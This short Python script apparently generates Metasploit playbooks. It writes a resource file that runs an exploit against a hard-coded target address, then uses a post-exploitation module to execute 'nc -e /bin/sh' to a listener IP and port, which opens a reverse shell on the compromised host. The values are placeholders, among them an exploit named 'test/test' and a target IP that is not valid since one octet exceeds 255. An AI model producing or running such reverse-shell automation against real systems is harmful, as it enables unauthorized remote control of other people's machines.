from TrivialFunctions import *
target = "192.13.312.13"
exploit = "test/test"
localIP = "0.0.0.0"
port = 6890
name = "Playbooks/" + target.replace(".", "") + exploit.replace("/", "_") + ".rb"
playbook = "use " + exploit + "\n" + "set rhost " + target + "\n" + "exploit -z\n" + "back\n" + "use post/multi/general/execute\n" + "set session 1\n" + "set command nc -e /bin/sh " + localIP + " " + str(
    port) + "\n" + "run"
writePlaybook(name, playbook)